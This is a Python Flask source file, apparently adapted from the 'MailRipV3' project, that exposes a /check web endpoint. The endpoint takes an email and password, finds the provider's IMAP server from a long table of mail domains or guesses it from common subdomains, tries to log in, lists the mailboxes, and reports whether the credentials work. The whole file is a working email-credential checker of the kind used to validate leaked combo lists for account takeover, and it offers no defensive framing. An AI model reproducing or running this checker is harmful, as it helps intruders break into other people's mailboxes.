import ssl, socket, imaplib
from flask import *
# https://github.com/DrPython3/MailRipV3  DrPython3
imap_domains = ["", "imap.", "imaps.", "mail.", "email.", "mx.", "inbound.", "securemail.", "imap.mail.", "imap-mail."]
imap_ports = [143, 993]
imap_services = {"online.de":"imap.1und1.de:993", "163.com":"imap.163.com:993", "1and1.co.uk":"imap.1und1.de:993", "1and1.com":"imap.1und1.de:993", "1and1.de":"imap.1und1.de:993", "1and1.es":"imap.1und1.de:993", "1and1.fr":"imap.1und1.de:993", "1blu.de":"imap.1blu.de:993", "1und1.de":"imap.1und1.de:993", "a1.net":"securemail.a1.net:993", "active24.com":"email.active24.com:993", "activist.com":"imap.mail.com:993", "adexec.com":"imap.mail.com:993", "africamail.com":"imap.mail.com:993", "aim.com":"imap.aim.com:993", "aircraftmail.com":"imap.mail.com:993", "alabama.usa.com":"imap.mail.com:993", "alaska.usa.com":"imap.mail.com:993", "alice-dsl.de":"mail.o2mail.de:993", "alice-dsl.net":"mail.o2mail.de:993", "alice.de":"imap.alice.de:993", "alice.it":"in.alice.it:143", "allergist.com":"imap.mail.com:993", "alumni.com":"imap.mail.com:993", "alumnidirector.com":"imap.mail.com:993", "americamail.com":"imap.mail.com:993", "ameritech.net":"inbound.att.net:995", "anarki.dk":"mail.telenor.dk:143", "anderledes.dk":"mail.telenor.dk:143", "angelic.com":"imap.mail.com:993", "aol.com":"imap.aol.com:993", "aol.com":"imap.de.aol.com:993", "aol.de":"imap.aim.com:993", "aon.at":"securemail.a1.net:993", "aqua.plala.or.jp":"aqua.mail.plala.or.jp:110", "archaeologist.com":"imap.mail.com:993", "arcor.de":"imap.arcor.de:993", "arcormail.de":"imap.arcor.de:993", "arizona.usa.com":"imap.mail.com:993", "artlover.com":"imap.mail.com:993", "arubapec.it":"imaps.pec.aruba.it:993", "asia-mail.com":"imap.mail.com:993", "atheist.com":"imap.mail.com:993", "att.net":"inbound.att.net:995", "australiamail.com":"imap.mail.com:993", "bartender.net":"imap.mail.com:993", "begavet.dk":"mail.telenor.dk:143", "belgacom.net":"imap.proximus.be:993", "bell.net":"imap.bell.net:993", "bellsouth.net":"inbound.att.net:995", "berlin.com":"imap.mail.com:993", "bigger.com":"imap.mail.com:993", "bigpond.com":"mail.bigpond.com:995", "bigpond.net.au":"mail.bigpond.com:995", "bigpond.net":"mail.bigpond.com:995", "bikerider.com":"imap.mail.com:993", "birdlover.com":"imap.mail.com:993", "bitnisse.dk":"mail.telenor.dk:143", "bk.ru":"imap.mail.ru:993", "blader.com":"imap.mail.com:993", "blu.it":"imapmail.libero.it:143", "bluemail.ch":"imaps.bluewin.ch:993", "bluewin.ch":"imaps.bluewin.ch:993", "boardermail.com":"imap.mail.com:993", "brazilmail.com":"imap.mail.com:993", "brew-master.com":"imap.mail.com:993", "btinternet.com":"mail.btinternet.com:993", "btopenworld.com":"mail.btinternet.com:993", "california.usa.com":"imap.mail.com:993", "californiamail.com":"imap.mail.com:993", "caress.com":"imap.mail.com:993", "catlover.com":"imap.mail.com:993", "cgl.ucsf.edu":"plato.cgl.ucsf.edu:993", "charter.com":"mobile.charter.net:993", "charter.net":"mobile.charter.net:993", "cheerful.com":"imap.mail.com:993", "chef.net":"imap.mail.com:993", "chello.at":"mail.upcmail.at:993", "chemist.com":"imap.mail.com:993", "chinamail.com":"imap.mail.com:993", "city.dk":"mail.telenor.dk:143", "cityweb.de":"mail.cityweb.de:993", "clerk.com":"imap.mail.com:993", "cliffhanger.com":"imap.mail.com:993", "club-internet.fr":"imap.sfr.fr:993", "cneweb.de":"mx.versatel.de:143", "collector.org":"imap.mail.com:993", "columnist.com":"imap.mail.com:993", "comcast.net":"imap.comcast.net:993", "comic.com":"imap.mail.com:993", "computer4u.com":"imap.mail.com:993", "consultant.com":"imap.mail.com:993", "contractor.net":"imap.mail.com:993", "cool.dk":"mail.telenor.dk:143", "coolsite.net":"imap.mail.com:993", "corp.mail.ru":"imap.mail.ru:993", "counsellor.com":"imap.mail.com:993", "count.com":"imap.mail.com:993", "couple.com":"imap.mail.com:993", "cutey.com":"imap.mail.com:993", "cyber-wizard.com":"imap.mail.com:993", "cyberdude.com":"imap.mail.com:993", "cyberdude.dk":"mail.telenor.dk:143", "cybergal.com":"imap.mail.com:993", "cyberjunkie.dk":"mail.telenor.dk:143", "dallasmail.com":"imap.mail.com:993", "dbzmail.com":"imap.mail.com:993", "deliveryman.com":"imap.mail.com:993", "diplomats.com":"imap.mail.com:993", "directbox.com":"imap.directbox.com:993", "disciples.com":"imap.mail.com:993", "dk-online.dk":"mail.telenor.dk:143", "dk2net.dk":"mail.telenor.dk:143", "doctor.com":"imap.mail.com:993", "doglover.com":"imap.mail.com:993", "doramail.com":"imap.mail.com:993", "dr.com":"imap.mail.com:993", "dublin.com":"imap.mail.com:993", "earthling.net":"imap.mail.com:993", "earthlink.net":"imap.earthlink.net:143", "eclipso":"mail.eclipso.de:993", "elinstallatoer.dk":"mail.telenor.dk:143", "elsker.dk":"mail.telenor.dk:143", "elvis.dk":"mail.telenor.dk:143", "elvisfan.com":"imap.mail.com:993", "email.com":"imap.mail.com:993", "email.cz":"imap.seznam.cz:993", "email.de":"imap.web.de:993", "email.dk":"mail.telenor.dk:143", "email.it":"imapmail.email.it:993", "emailsrvr.com":"secure.emailsrvr.com:993", "engineer.com":"imap.mail.com:993", "englandmail.com":"imap.mail.com:993", "epost.de":"mail.epost.de:993", "europe.com":"imap.mail.com:993", "europemail.com":"imap.mail.com:993", "execs.com":"imap.mail.com:993", "exmail.de":"imap.web.de:993", "fald.dk":"mail.telenor.dk:143", "fan.com":"imap.mail.com:993", "fedt.dk":"mail.telenor.dk:143", "feelings.com":"imap.mail.com:993", "feminin.dk":"mail.telenor.dk:143", "film.dk":"mail.telenor.dk:143", "financier.com":"imap.mail.com:993", "firemail.de":"firemail.de:143", "fireman.net":"imap.mail.com:993", "flash.net":"inbound.att.net:995", "florida.usa.com":"imap.mail.com:993", "foni.net":"mx.versatel.de:143", "footballer.com":"imap.mail.com:993", "forening.dk":"mail.telenor.dk:143", "fps-ingolstadt.de":"imap.fps-ingolstadt.de:993", "freakmail.de":"imap.web.de:993", "free.fr":"imap.free.fr:993", "freenet.de":"mx.freenet.de:993", "freesurf.ch":"imap.sunrise.ch:993", "gadefejer.dk":"mail.telenor.dk:143", "gandi.net":"mail.gandi.net:993", "gardener.com":"imap.mail.com:993", "gason.dk":"mail.telenor.dk:143", "gelsennet.de":"mx.versatel.de:143", "genion.de":"imap.o2mail.de:993", "geologist.com":"imap.mail.com:993", "germanymail.com":"imap.mail.com:993", "gigahost.dk":"mail.gigahost.dk:993", "gigapec.it":"imaps.pec.aruba.it:993", "gmail.com":"imap.gmail.com:993", "gmail.com":"imap.googlemail.com:993", "gmx.at":"imap.gmx.net:993", "gmx.biz":"imap.gmx.net:993", "gmx.ca":"imap.gmx.com:993", "gmx.ch":"imap.gmx.net:993", "gmx.cn":"imap.gmx.com:993", "gmx.co.in":"imap.gmx.com:993", "gmx.co.uk":"imap.gmx.com:993", "gmx.com.br":"imap.gmx.com:993", "gmx.com.my":"imap.gmx.com:993", "gmx.com.tr":"imap.gmx.com:993", "gmx.com":"imap.gmx.com:993", "gmx.de":"imap.gmx.net:993", "gmx.es":"imap.gmx.com:993", "gmx.eu":"imap.gmx.net:993", "gmx.fr":"imap.gmx.com:993", "gmx.hk":"imap.gmx.com:993", "gmx.ie":"imap.gmx.com:993", "gmx.info":"imap.gmx.net:993", "gmx.it":"imap.gmx.com:993", "gmx.li":"imap.gmx.com:993", "gmx.net":"imap.gmx.net:993", "gmx.org":"imap.gmx.net:993", "gmx.ph":"imap.gmx.com:993", "gmx.pt":"imap.gmx.com:993", "gmx.ru":"imap.gmx.com:993", "gmx.se":"imap.gmx.com:993", "gmx.sg":"imap.gmx.com:993", "gmx.tm":"imap.gmx.com:993", "gmx.tw":"imap.gmx.com:993", "gmx.us":"imap.gmx.com:993", "go4more.de":"imap.1und1.de:993", "goneo.de":"imap.goneo.de:993", "google.com":"imap.gmail.com:993", "google.com":"imap.googlemail.com:993", "googlemail.com":"imap.gmail.com:993", "googlemail.com":"imap.googlemail.com:993", "graduate.org":"imap.mail.com:993", "gransy.com":"imap.gransy.com:993", "graphic-designer.com":"imap.mail.com:993", "grin.dk":"mail.telenor.dk:143", "grov.dk":"mail.telenor.dk:143", "hackermail.com":"imap.mail.com:993", "hairdresser.net":"imap.mail.com:993", "hamburg.de":"mail2.hamburg.de:993", "hanse.net":"imap.o2mail.de:993", "hardworking.dk":"mail.telenor.dk:143", "heaven.dk":"mail.telenor.dk:143", "hemmelig.dk":"mail.telenor.dk:143", "hilarious.com":"imap.mail.com:993", "hispeed.ch":"imap.hispeed.ch:993", "hockeymail.com":"imap.mail.com:993", "homemail.com":"imap.mail.com:993", "hot-shot.com":"imap.mail.com:993", "hotmail.co.jp":"imap-mail.outlook.com:993", "hotmail.co.uk":"imap-mail.outlook.com:993", "hotmail.com.br":"imap-mail.outlook.com:993", "hotmail.com":"imap-mail.outlook.com:993", "hotmail.de":"imap-mail.outlook.com:993", "hotmail.es":"imap-mail.outlook.com:993", "hotmail.fr":"imap-mail.outlook.com:993", "hotmail.it":"imap-mail.outlook.com:993", "hour.com":"imap.mail.com:993", "htp-tel.de":"mail.htp-tel.de :993", "huleboer.dk":"mail.telenor.dk:143", "humanoid.net":"imap.mail.com:993", "illinois.usa.com":"imap.mail.com:993", "image.dk":"mail.telenor.dk:143", "iname.com":"imap.mail.com:993", "inbound.dk":"mail.telenor.dk:143", "inbox.lt":"mail.inbox.lt:995", "inbox.lv":"mail.inbox.lv:995", "inbox.ru":"imap.mail.ru:993", "indbakke.dk":"mail.telenor.dk:143", "infile.dk":"mail.telenor.dk:143", "info.dk":"mail.telenor.dk:143", "ingpec.eu":"imaps.pec.aruba.it:993", "innocent.com":"imap.mail.com:993", "inode.at":"mail.inode.at:993", "inorbit.com":"imap.mail.com:993", "instruction.com":"imap.mail.com:993", "instructor.net":"imap.mail.com:993", "insurer.com":"imap.mail.com:993", "internetserver.cz":"imap.gransy.com:993", "inwind.it":"imapmail.libero.it:143", "io.dk":"mail.telenor.dk:143", "iol.it":"imapmail.libero.it:143", "irelandmail.com":"imap.mail.com:993", "ispgateway.de":"sslmailpool.ispgateway.de:993", "it.dk":"mail.telenor.dk:143", "italymail.com":"imap.mail.com:993", "ix.netcom.com":"imap.earthlink.net:143", "japan.com":"imap.mail.com:993", "jazztel.es":"imap.gmail.com:993", "jazztel.es":"imap.googlemail.com:993", "journalist.com":"imap.mail.com:993", "jyde.dk":"mail.telenor.dk:143", "kabelbw.de":"imap.kabelbw.de:993", "kabelmail":"imap.kabelmail.de:993", "keromail.com":"imap.mail.com:993", "kidcity.be":"imap.proximus.be:993", "kittymail.com":"imap.mail.com:993", "klog.dk":"mail.telenor.dk:143", "knus.dk":"mail.telenor.dk:143", "koreamail.com":"imap.mail.com:993", "krudt.dk":"mail.telenor.dk:143", "kulturel.dk":"mail.telenor.dk:143", "kundenserver.de":"imap.1und1.de:993", "laposte.net":"imap.laposte.net:993", "larsen.dk":"mail.telenor.dk:143", "lawyer.com":"imap.mail.com:993", "lazy.dk":"mail.telenor.dk:143", "legislator.com":"imap.mail.com:993", "libero.it":"imapmail.libero.it:143", "linuxmail.org":"imap.mail.com:993", "list.ru":"imap.mail.ru:993", "live.at":"imap-mail.outlook.com:993", "live.co.jp":"imap-mail.outlook.com:993", "live.co.uk":"imap-mail.outlook.com:993", "live.com":"imap-mail.outlook.com:993", "live.de":"imap-mail.outlook.com:993", "live.fr":"imap-mail.outlook.com:993", "live.it":"imap-mail.outlook.com:993", "live.jp":"imap-mail.outlook.com:993", "live.nl":"imap-mail.outlook.com:993", "london.com":"imap.mail.com:993", "loop.de":"imap.o2mail.de:993", "loveable.com":"imap.mail.com:993", "lovecat.com":"imap.mail.com:993", "lycos":"imap.lycos.com:993", "lystig.dk":"mail.telenor.dk:143", "mac.com":"imap.mail.me.com:993", "mad.scientist.com":"imap.mail.com:993", "madonnafan.com":"imap.mail.com:993", "madrid.com":"imap.mail.com:993", "mail.com":"imap.mail.com:993", "mail.de":"imap.mail.de:993", "mail.dia.dk":"mail.telenor.dk:143", "mail.org":"imap.mail.com:993", "mail.ru":"imap.mail.ru:993", "mail.telenor.dk":"mail.telenor.dk:143", "marchmail.com":"imap.mail.com:993", "maskulin.dk":"mail.telenor.dk:143", "me.com":"imap.mail.me.com:993", "mexicomail.com":"imap.mail.com:993", "min-postkasse.dk":"mail.telenor.dk:143", "mindless.com":"imap.mail.com:993", "mindspring.com":"imap.earthlink.net:143", "minister.com":"imap.mail.com:993", "mobil.dk":"mail.telenor.dk:143", "mobsters.com":"imap.mail.com:993", "monarchy.com":"imap.mail.com:993", "mopera.net":"mail.mopera.net:993", "moscowmail.com":"imap.mail.com:993", "mozilla.com":"imap.googlemail.com:993", "mozillafoundation.org":"imap.googlemail.com:993", "msn.com":"imap-mail.outlook.com:993", "munich.com":"imap.mail.com:993", "musician.org":"imap.mail.com:993", "muslim.com":"imap.mail.com:993", "musling.dk":"mail.telenor.dk:143", "mymail.ch":"mail.mymail.ch:993", "mypec.eu":"imaps.pec.aruba.it:993", "myself.com":"imap.mail.com:993", "narod.ru":"imap.yandex.com:993", "natteliv.dk":"mail.telenor.dk:143", "netbruger.dk":"mail.telenor.dk:143", "netcologne.de":"imap.netcologne.de:993", "netscape.net":"imap.aol.com:993", "neuf.fr":"imap.sfr.fr:993", "newyork.usa.com":"imap.mail.com:993", "nord-com.net":"imap.swbmail.de:993", "null.net":"imap.mail.com:993", "nvbell.net":"inbound.att.net:995", "nycmail.com":"imap.mail.com:993", "o2.pl":"poczta.o2.pl:995", "o2mail.de":"imap.o2mail.de:993", "o2online.de":"imap.o2mail.de:993", "oath.com":"imap.mail.com:993", "one.com":"imap.one.com:993", "online.de":"imap.1und1.de:993", "onlinehome.de":"imap.1und1.de:993", "op.pl":"pop3.poczta.onet.pl:995", "optician.com":"imap.mail.com:993", "orange.fr":"imap.orange.fr:993", "osnanet.de":"imap.osnanet.de:993", "outlook.com":"imap-mail.outlook.com:993", "ovh.net":"ssl0.ovh.net:993", "pacbell.net":"inbound.att.net:995", "pacificwest.com":"imap.mail.com:993", "pec.it":"imaps.pec.aruba.it:993", "pedal.dk":"mail.telenor.dk:143", "pengemand.dk":"mail.telenor.dk:143", "peoplepc.com":"imap.peoplepc.com:143", "petlover.com":"imap.mail.com:993", "photographer.net":"imap.mail.com:993", "playful.com":"imap.mail.com:993", "pobox.com":"mail.pobox.com:993", "poetic.com":"imap.mail.com:993", "pokerface.dk":"mail.telenor.dk:143", "politician.com":"imap.mail.com:993", "popstar.com":"imap.mail.com:993", "post.com":"imap.mail.com:993", "post.cybercity.dk":"mail.telenor.dk:143", "post.cz":"imap.seznam.cz:993", "post.dia.dk":"mail.telenor.dk:143", "posteo.at":"posteo.de:143", "posteo.ch":"posteo.de:143", "posteo.de":"posteo.de:143", "posteo.eu":"posteo.de:143", "posteo.org":"posteo.de:143", "postman.dk":"mail.telenor.dk:143", "presidency.com":"imap.mail.com:993", "priest.com":"imap.mail.com:993", "privat.dia.dk":"mail.telenor.dk:143", "privatmail.dk":"mail.telenor.dk:143", "prodigy.net":"inbound.att.net:995", "programmer.net":"imap.mail.com:993", "proximus.be":"imap.proximus.be:993", "ptd.net":"promail.ptd.net:993", "publicist.com":"imap.mail.com:993", "q.com":"mail.q.com:995", "qq.com":"imap.qq.com:993", "quake.dk":"mail.telenor.dk:143", "rambler.ru":"mail.rambler.ru:993", "ready.dk":"mail.telenor.dk:143", "realtyagent.com":"imap.mail.com:993", "reborn.com":"imap.mail.com:993", "reggaefan.com":"imap.mail.com:993", "religious.com":"imap.mail.com:993", "repairman.com":"imap.mail.com:993", "representative.com":"imap.mail.com:993", "rescueteam.com":"imap.mail.com:993", "revenue.com":"imap.mail.com:993", "rocketmail.com":"imap.mail.yahoo.com:993", "rocketship.com":"imap.mail.com:993", "rockfan.com":"imap.mail.com:993", "rome.com":"imap.mail.com:993", "royal.net":"imap.mail.com:993", "rr.com":"mail.twc.com:993", "ruhrnet-online.de":"mx.versatel.de:143", "rzone.de":"imap.strato.de:993", "saintly.com":"imap.mail.com:993", "salesperson.net":"imap.mail.com:993", "sanfranmail.com":"imap.mail.com:993", "sbcglobal.net":"inbound.att.net:995", "schlund.de":"imap.1und1.de:993", "scientist.com":"imap.mail.com:993", "scotlandmail.com":"imap.mail.com:993", "secret.dk":"mail.telenor.dk:143", "secretary.net":"imap.mail.com:993", "seductive.com":"imap.mail.com:993", "seznam.cz":"imap.seznam.cz:993", "sfr.fr":"imap.sfr.fr:993", "singapore.com":"imap.mail.com:993", "sky.com":"imap.tools.sky.com:993", "skynet.be":"imap.proximus.be:993", "sleepy.dk":"mail.telenor.dk:143", "smart-mail":"imap.smart-mail.de:993", "smtp.cz":"email.active24.com:993", "snakebite.com":"imap.mail.com:993", "snet.net":"inbound.att.net:995", "so.wind.jp":"so.wind.ne.jp:143", "so.wind.ne.jp":"so.wind.ne.jp:143", "sofort-start.de":"imap.1und1.de:993", "sofort-surf.de":"imap.1und1.de:993", "sofortstart.de":"imap.1und1.de:993", "sofortsurf.de":"imap.1und1.de:993", "songwriter.net":"imap.mail.com:993", "soon.com":"imap.mail.com:993", "spainmail.com":"imap.mail.com:993", "spoluzaci.cz":"imap.seznam.cz:993", "sporty.dk":"mail.telenor.dk:143", "strato.de":"imap.strato.de:993", "studenti.univr.it":"univr.mail.cineca.it:993", "sunrise.ch":"imap.sunrise.ch:993", "superbruger.dk":"mail.telenor.dk:143", "surfeu.de":"mail.surfeu.de:993", "swbell.net":"inbound.att.net:995", "swbmail.de":"imap.swbmail.de:993", "swissonline.ch":"imap.hispeed.ch:993", "sympatico.ca":"imap.bell.net:993", "t-online.de":"secureimap.t-online.de:993", "talent.dk":"mail.telenor.dk:143", "talk21.com":"mail.btinternet.com:993", "tanke.dk":"mail.telenor.dk:143", "taxidriver.dk":"mail.telenor.dk:143", "teachers.org":"imap.mail.com:993", "techie.com":"imap.mail.com:993", "technologist.com":"imap.mail.com:993", "teens.dk":"mail.telenor.dk:143", "teknik.dk":"mail.telenor.dk:143", "telebel.de":"mx.versatel.de:143", "telelev.de":"mx.versatel.de:143", "telenet.be":"imap.telenet.be:993", "telstra.com":"mail.bigpond.com:995", "terra.es":"imap4.terra.es:143", "texas.usa.com":"imap.mail.com:993", "thegame.com":"imap.mail.com:993", "therapist.net":"imap.mail.com:993", "thinline.cz":"mail.cesky-hosting.cz:993", "tiscali.it":"imap.tiscali.it:993", "tiscali.net":"imap.tiscali.it:993", "tjekket.dk":"mail.telenor.dk:143", "toke.com":"imap.mail.com:993", "tokyo.com":"imap.mail.com:993", "toothfairy.com":"imap.mail.com:993", "traceroute.dk":"mail.telenor.dk:143", "tu-berlin.de":"mailbox.tu-berlin.de:993", "tv.dk":"mail.telenor.dk:143", "tvstar.com":"imap.mail.com:993", "ugenstilbud.dk":"mail.telenor.dk:143", "umpire.com":"imap.mail.com:993", "ungdom.dk":"mail.telenor.dk:143", "uni-muenster.de":"imap.uni-muenster.de:993", "uni.de":"mail.uni.de:993", "unitybox.de":"imap.unitybox.de:993", "unitybox.de":"mail.unitybox.de:993", "usa.com":"imap.mail.com:993", "utanet.at":"mail.utanet.at:993", "uymail.com":"imap.mail.com:993", "versanet.de":"mx.versatel.de:143", "versatel.de":"imap4.versatel.de:993", "versatel.de":"mx.versatel.de:143", "video.dk":"mail.telenor.dk:143", "vip.cybercity.dk":"mail.telenor.dk:143", "virgin.net":"imap4.virgin.net:993", "virginmedia.com":"imap.virginmedia.com:993", "vittig.dk":"mail.telenor.dk:143", "vm.aikis.or.jp":"mail.aikis.or.jp:995", "vodafone.de":"imap.vodafone.de:993", "vodafone.net":"imap.vodafone.de:993", "vr-web.de":"mail.vr-web.de:993", "vtxmail.ch":"smtp.vtxmail.ch:993", "wallet.com":"imap.mail.com:993", "wanadoo.fr":"imap.orange.fr:993", "wans.net":"inbound.att.net:995", "web.de":"imap.web.de:993", "webhuset.no":"imap.webhuset.no:993", "webname.com":"imap.mail.com:993", "weirdness.com":"imap.mail.com:993", "who.net":"imap.mail.com:993", "whoever.com":"imap.mail.com:993", "winning.com":"imap.mail.com:993", "witty.com":"imap.mail.com:993", "wol.dk":"mail.telenor.dk:143", "worker.com":"imap.mail.com:993", "workmail.com":"imap.mail.com:993", "worldonline.dk":"mail.telenor.dk:143", "wp.pl":"imap.wp.pl:993", "writeme.com":"imap.mail.com:993", "xtra.co.nz":"pop3.xtra.co.nz:995", "ya.ru":"imap.yandex.com:993", "yahoo.co.jp":"pop.mail.yahoo.co.jp:995", "yahoo.co.nz":"imap.mail.yahoo.com:993", "yahoo.co.uk":"imap.mail.yahoo.com:993", "yahoo.com.ar":"imap.mail.yahoo.com:993", "yahoo.com.au":"imap.mail.yahoo.com:993", "yahoo.com.br":"imap.mail.yahoo.com:993", "yahoo.com.mx":"imap.mail.yahoo.com:993", "yahoo.com":"imap.mail.yahoo.com:993", "yahoo.de":"imap.mail.yahoo.com:993", "yahoo.es":"imap.mail.yahoo.com:993", "yahoo.fr":"imap.mail.yahoo.com:993", "yahoo.gr":"imap.mail.yahoo.com:993", "yahoo.it":"imap.mail.yahoo.com:993", "yahoo.no":"imap.mail.yahoo.com:993", "yahoo.se":"imap.mail.yahoo.com:993", "yahoodns.net":"imap.mail.yahoo.com:993", "yandex.by":"imap.yandex.com:993", "yandex.com":"imap.yandex.com:993", "yandex.kz":"imap.yandex.com:993", "yandex.net":"imap.yandex.com:993", "yandex.ru":"imap.yandex.com:993", "yandex.ua":"imap.yandex.com:993", "yeah.net":"imap.yeah.net:993", "ymail.com":"imap.mail.yahoo.com:993", "yours.com":"imap.mail.com:993", "zeelandnet.nl":"mail.zeelandnet.nl:993"}

app = Flask(__name__)

@app.route('/check')
def check():
    global imap_domains, imap_ports, imap_services
    try:
        sslcontext = ssl.create_default_context()
        socket.setdefaulttimeout(float(3.0))
        target_email = str(request.args.get('email'))
        target_user = str(request.args.get('email'))
        target_password = str(request.args.get('password'))
        target_host = str('')
        target_port = int(0)
        service_info = str('')
        service_found = False
        connection_ok = False
        md5_login = False
        login_valid = False
        checker_result = False
        output = None
        try:
            service_info = str(imap_services[str(target_email.split('@')[1])])
            target_host = str(service_info.split(':')[0])
            target_port = int(service_info.split(':')[1])
            service_found = True
        except: pass
        if service_found == True:
            try:
                if int(target_port) == int(993):
                    imap_connection = imaplib.IMAP4_SSL(host=str(target_host), port=int(target_port), ssl_context=sslcontext)
                    connection_ok = True
                else:
                    imap_connection = imaplib.IMAP4(host=str(target_host), port=int(target_port))
                    try: imap_connection.starttls(ssl_context=sslcontext)
                    except: pass
                    connection_ok = True
            except: pass
        if connection_ok == False:
            for subdomain in imap_domains:
                test_host = str(str(subdomain) + str(target_email.split('@')[1]).lower())
                for next_port in imap_ports:
                    try:
                        if int(next_port) == int(993):
                            imap_connection = imaplib.IMAP4_SSL(host=str(test_host), port=int(next_port), ssl_context=sslcontext)
                            target_host = str(test_host)
                            target_port = int(next_port)
                            connection_ok = True
                        else:
                            imap_connection = imaplib.IMAP4(host=str(test_host), port=int(next_port))
                            try: imap_connection.starttls(ssl_context=sslcontext)
                            except: pass
                            target_host = str(test_host)
                            target_port = int(next_port)
                            connection_ok = True
                        break
                    except: continue
                if connection_ok == True: break
                else: continue
        if connection_ok == True:
            try:
                if 'AUTH=CRAM-MD5' in imap_connection.capabilities:
                    md5_login = True
                    try:
                        login_response = imap_connection.login_cram_md5(user=str(target_user), password=str(target_password))
                        if str('OK') in login_response: 
                            login_valid = True
                    except:
                        try:
                            target_user = str(target_email.split('@')[0])
                            login_response = imap_connection.login_cram_md5(user=str(target_user), password=str(target_password))
                            if str('OK') in login_response:
                                login_valid = True
                        except:
                            output = "md5 login failed"
                else: pass
            except: pass
            if md5_login == False:
                try:
                    login_response = imap_connection.login(user=str(target_user), password=str(target_password))
                    if str('OK') in login_response:
                        login_valid = True
                except:
                    try:
                        target_user = str(target_email.split('@')[0])
                        login_response = imap_connection.login(user=str(target_user), password=str(target_password))
                        if str('OK') in login_response:
                            login_valid = True
                    except:
                        output = "login failed"
        else:
            output = "no connection"
        if login_valid == True:
            try:
                list_response = imap_connection.list()
                if str('OK') in list_response:
                    checker_result = True
                    output = "login valid, listing mailboxes ok"
                else:
                    output = "login valid, listing mailboxes failed"
            except: pass
        try:
            imap_connection.logout()
        except: pass
        if checker_result == True or login_valid == True:
            return {"Success": 1, "Email": str(target_email), "Login": f"{str(target_user)}:{str(target_password)}", "Host": f"{str(target_host)}:{str(target_port)}", "Credits": "https://github.com/DrPython3/MailRipV3 DrPython3"}
        else: return {"Success": 0, "Info": output, "Credits": "https://github.com/DrPython3/MailRipV3 DrPython3"}
    except: return {"Success": 0, "Info": "check failed", "Credits": "https://github.com/DrPython3/MailRipV3 DrPython3"}

if __name__ == '__main__':
    app.run(debug=False, host='216.24.57.252', port=8080)
